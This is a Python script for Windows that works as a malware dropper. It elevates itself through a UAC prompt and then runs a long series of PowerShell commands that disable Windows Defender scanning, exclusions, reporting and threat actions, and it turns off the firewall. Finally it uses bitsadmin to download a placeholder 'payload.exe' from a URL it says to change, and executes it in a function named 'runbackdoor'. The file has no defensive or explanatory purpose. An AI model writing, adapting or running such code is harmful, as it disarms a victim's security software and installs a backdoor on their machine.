from pathlib import Path
import platform
import tempfile
import subprocess
import time
import os
import sys
import win32com.shell.shell as shell
ASADMIN = 'asadmin'

if sys.argv[-1] != ASADMIN:
    script = os.path.abspath(sys.argv[0])
    params = ' '.join([script] + sys.argv[1:] + [ASADMIN])
    shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters=params)
    sys.exit(0) 
 
subprocess.call("powershell.exe -command Add-MpPreference -ExclusionExtension .exe", shell=TRUE)
subprocess.call("powershell.exe -command Add-MpPreference -ExclusionExtension .tmp", shell=TRUE)
subprocess.call("powershell.exe -command Set-MpPreference -EnableControlledFolderAccess Disabled", shell=TRUE)
subprocess.call("powershell.exe -command Set-MpPreference -PUAProtection disable", shell=TRUE)
subprocess.call("powershell.exe -command Add-MpPreference -ExclusionExtension .exe", shell=TRUE)
subprocess.call("powershell.exe -command Set-MpPreference -DisableBlockAtFirstSeen $true", shell=TRUE)
subprocess.call("powershell.exe -command Set-MpPreference -DisableIOAVProtection $true", shell=TRUE)
subprocess.call("powershell.exe -command Set-MpPreference -DisablePrivacyMode $true", shell=TRUE)
subprocess.call("powershell.exe -command Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true", shell=TRUE)
subprocess.call("powershell.exe -command Set-MpPreference -DisableArchiveScanning $true", shell=TRUE)
subprocess.call("powershell.exe -command Set-MpPreference -DisableIntrusionPreventionSystem $true", shell=TRUE)
subprocess.call("powershell.exe -command Set-MpPreference -DisableScriptScanning $true", shell=TRUE)
subprocess.call("powershell.exe -command Set-MpPreference -SubmitSamplesConsent 2", shell=TRUE)
subprocess.call("powershell.exe -command Set-MpPreference -MAPSReporting 0", shell=TRUE)
subprocess.call("powershell.exe -command Set-MpPreference -HighThreatDefaultAction 6 -Force", shell=TRUE)
subprocess.call("powershell.exe -command Set-MpPreference -ModerateThreatDefaultAction 6", shell=TRUE)
subprocess.call("powershell.exe -command Set-MpPreference -LowThreatDefaultAction 6", shell=TRUE)
subprocess.call("powershell.exe -command Set-MpPreference -SevereThreatDefaultAction 6", shell=TRUE)
subprocess.call("powershell.exe -command Set-MpPreference -ScanScheduleDay 8", shell=TRUE)
subprocess.call("powershell.exe -command netsh advfirewall set allprofiles state off", shell=TRUE)

time.sleep(25)

subprocess.call(
    
"bitsadmin /transfer mydownloadjob /download /priority FOREGROUND https://direct-url-of-payload/payload.exe %temp%\payload.exe", shell=TRUE) #change this url 

tempdir = Path(tempfile.gettempdir())

os.chdir(tempdir)

def runbackdoor():
    
    os.system("payload.exe") #change this 
runbackdoor()


sys.exit()




